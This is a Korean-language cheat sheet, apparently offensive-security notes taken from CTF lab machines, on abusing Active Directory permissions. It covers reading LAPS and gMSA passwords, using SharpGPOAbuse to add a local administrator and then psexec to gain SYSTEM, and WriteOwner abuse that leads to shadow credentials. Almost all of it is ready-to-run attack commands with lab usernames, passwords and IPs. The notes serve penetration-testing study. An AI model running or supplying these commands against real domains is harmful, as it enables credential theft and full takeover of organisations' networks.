### ReadLAPSPassword
LAPS로 구성된 대상 컴퓨터에서 GenericAll 또는 AllExtendedRights(또는 도메인별 동기화를 위해 GetChanges와 (GetChangesInFilteredSet 또는 GetChangesAll의 조합)가 있는 개체를 제어할 때 수행될 수 있습니다.

그러면 공격자는 컴퓨터 계정의 LAPS 비밀번호(즉, 컴퓨터의 로컬 관리자의 비밀번호)를 읽을 수 있습니다.

**ldapsearch**
```python
ldapsearch -H ldap://streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

**netexec**
```python
netexec ldap 10.10.11.158 -d "streamio.htb" -u "JDgodd" -p "JDg0dd1s@d0p3cr3@t0r" --module laps
```

**bloodyAD**
```python
bloodyAD --host 10.10.11.158 -d streamio.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```


### ReadGMSAPassword
bloodhound 등에서 ReadGMSAPassword 권한이 있음을 확인함.
![[Pasted image 20250715222407.png]]

따려고 하는 계정 이름을 --accountname 인수로 넣어줌
```bash
gmsapasswordreader.exe --accountname gmsa-jkohler
```

참고: https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword
GMSAPasswordReader: https://github.com/rvazarkar/GMSAPasswordReader


### GPOAbuse
#### Generic Write 권한이 있는 경우
소스코드: https://github.com/FSecureLABS/SharpGPOAbuse
exe 파이너리: https://github.com/byronkg/SharpGPOAbuse
```cmd
cmd.exe /c .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```
이후 psexec 으로 접근하면 SYSTEM 권한을 획득할 수 있다.
```bash
impacket-psexec 'vault.offsec/anirudh:SecureHM'@192.168.129.172
```

### WriteOwner
#### Only shadow credential (Only if user owns the account now)
```sh
certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
```

#### If user not owns the account now..
```sh
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
# Shadow Credential
certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
```


